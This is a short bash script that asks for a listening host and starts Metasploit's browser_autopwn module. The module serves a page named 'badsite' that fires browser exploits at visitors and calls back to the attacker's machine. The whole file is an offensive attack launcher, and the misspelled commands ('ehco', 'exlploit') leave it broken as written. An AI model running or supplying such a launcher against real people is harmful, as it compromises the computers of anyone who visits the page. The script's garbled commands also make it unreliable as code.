#!/bin/bash 

#get user input for listening host
ehco "enter the listening host"
read LHOST1

#run msfconsole 
msfconsole -x "use auxiliary/server/browser_autopwn;\

set LHOST $LHOST1;\
set URIPATH badsite;\
set SRVHOST $LHOST1;\
exlploit"
